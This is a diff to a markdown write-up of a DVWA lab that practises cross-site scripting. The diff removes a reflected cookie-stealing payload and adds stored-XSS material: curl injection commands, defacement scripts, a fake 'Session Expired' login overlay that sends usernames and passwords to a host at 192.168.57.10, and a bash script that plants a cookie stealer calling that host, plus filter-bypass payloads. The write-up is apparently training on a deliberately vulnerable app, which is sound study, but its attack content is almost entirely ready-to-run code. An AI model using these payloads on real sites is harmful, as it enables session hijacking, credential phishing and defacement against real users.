@@ -151,15 +151,6 @@ column_name:
 
 ![XSS-alert-img](XSS-alert-img.png)
 
-#### Attack of cookies steal XSS reflected
-
-```
-<script>
-document.write('<img src="http://192.168.57.10/steal.php?c=' + document.cookie + '" />')
-</script>
-```
-
-![XSS-reflected-.10-cookies](XSS-reflected-.10-cookies.png)
 
 #### Redirection to a malicious site
 
@@ -224,4 +215,148 @@ curl -v -X POST \
 ![XSS-reflected-JS-keylogger](XSS-reflected-JS-keylogger.png)
 
 Which means that we were not successful on doing an XSS-attack in this case
+
+
+#### Stealing cookies
+
+```
+PAYLOAD='<img src=x onerror=alert(document.cookie)>'
+```
+![XSS-stored-cookies-stealing-1](XSS-stored-cookies-stealing-1.png)
+
+
+```
+curl -v -X POST \ 
+    -b "security=$SECURITY; PHPSESSID=$PHPSESSID" \
+    -H "Content-Type: application/x-www-form-urlenco ded" \
+    --data-urlencode="txtName=JS-keylogger" \
+    --data-urlencode="mtxtMessage=${PAYLOAD}" \
+    -d "btnSign=Sign+Guestbook" \
+    "${DVWA_URL}/vulnerabilities/xss_s/" > stealing_cookies_payload.txt
+```
+![XSS-stored-cookies-stealing](XSS-stored-cookies-stealing.png)
+
+
+
+#### Defacement attack
+
+```
+<script>
+document.body.innerHTML = '<h1>HACKED BY TechShield Assessment</h1><p>Security Vulnerability Found</p>';
+</script>
+```
+
+```
+curl -v -X POST \ 
+    -b "security=$SECURITY; PHPSESSID=$PHPSESSID" \
+    -H "Content-Type: application/x-www-form-urlenconded" \
+    --data-urlencode="txtName=JS-keylogger" \
+    --data-urlencode="mtxtMessage=${DEFACEMENT_PAYLOAD}" \
+    -d "btnSign=Sign+Guestbook" \
+    "${DVWA_URL}/vulnerabilities/xss_s/" > defacement_payload.txt
+```
+
+```
+<script>
+// Cambiar todo el contenido
+document.write('<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;z-index:9999;"><h1>⚠️ SECURITY ALERT ⚠️</h1><p>This site has been compromised</p></div>');
+</script>
+```
+
+XSS to phishing
+```
+<script>
+// Guardar contenido original
+var originalContent = document.body.innerHTML;
+
+// Crear formulario de phishing
+document.body.innerHTML = '
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#333;z-index:9999;padding:20px;">
+  <div style="background:white;width:300px;margin:100px auto;padding:20px;border-radius:10px;">
+    <h2>Session Expired</h2>
+    <p>Please login again:</p>
+    <form id="phish">
+      <input type="text" name="user" placeholder="Username" style="width:100%;margin:10px 0;padding:8px;"><br>
+      <input type="password" name="pass" placeholder="Password" style="width:100%;margin:10px 0;padding:8px;"><br>
+      <button type="submit" style="width:100%;padding:10px;background:blue;color:white;border:none;">Login</button>
+    </form>
+  </div>
+</div>';
+
+// Capturar credenciales
+document.getElementById('phish').onsubmit = function(e) {
+  e.preventDefault();
+  var user = this.user.value;
+  var pass = this.pass.value;
+  
+  // Enviar a atacante
+  var img = new Image();
+  img.src = 'http://192.168.57.10:8000/log.php?u=' + user + '&p=' + pass;
+  
+  // Restaurar página (opcional)
+  document.body.innerHTML = originalContent;
+  alert("Login successful!");
+  return false;
+};
+</script>
+```
+
+Automation script
+```
+#!/bin/bash
+# DVWA_XSS_Stored_Attack.sh
+
+DVWA_URL="http://192.168.57.30/dvwa"
+PHPSESSID="[TU_SESSION_ID]"
+SECURITY="low"
+
+echo "[*] Starting DVWA Stored XSS Attack"
+
+# 1. Test básico XSS
+echo "[1/5] Testing basic XSS..."
+curl -s -b "security=$SECURITY; PHPSESSID=$PHPSESSID" \
+  -d "txtName=XSS-Test&mtxMessage=<script>alert('XSS')</script>&btnSign=Sign+Guestbook" \
+  "$DVWA_URL/vulnerabilities/xss_s/" | grep -i "alert\|script"
+
+# 2. XSS con imagen
+echo "[2/5] Testing XSS with image tag..."
+curl -s -b "security=$SECURITY; PHPSESSID=$PHPSESSID" \
+  -d "txtName=Img-XSS&mtxMessage=<img src=x onerror=alert('Hacked')>&btnSign=Sign+Guestbook" \
+  "$DVWA_URL/vulnerabilities/xss_s/"
+
+# 3. XSS para robo de cookies
+echo "[3/5] Deploying cookie stealer..."
+COOKIE_STEALER='<script>new Image().src="http://192.168.57.10:8000/steal.php?c="+encodeURIComponent(document.cookie);</script>'
+curl -s -b "security=$SECURITY; PHPSESSID=$PHPSESSID" \
+  -d "txtName=Cookie-Stealer&mtxMessage=${COOKIE_STEALER}&btnSign=Sign+Guestbook" \
+  "$DVWA_URL/vulnerabilities/xss_s/"
+
+# 4. Ver entradas del guestbook
+echo "[4/5] Checking guestbook entries..."
+curl -s -b "security=$SECURITY; PHPSESSID=$PHPSESSID" \
+  "$DVWA_URL/vulnerabilities/xss_s/" | grep -A 2 -B 2 "XSS-Test\|Img-XSS\|Cookie-Stealer"
+
+# 5. Limpiar guestbook (opcional)
+echo "[5/5] Cleaning guestbook (optional)..."
+# Nota: Esto requiere conocer el ID de la entrada
+# curl -s -b "security=$SECURITY; PHPSESSID=$PHPSESSID" \
+#   -d "id=[ENTRY_ID]&btnClear=Clear+Guestbook" \
+#   "$DVWA_URL/vulnerabilities/xss_s/"
+
+echo "[+] Stored XSS attack deployment complete"
+```
+
+Other payloads
+```
+<ScRiPt>alert('XSS')</ScRiPt>
+
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+```
+
+Using HTML events
+
+```
+<body onload=alert('XSS')>
+<input type="text" onfocus=alert('XSS') autofocus>
+```
 
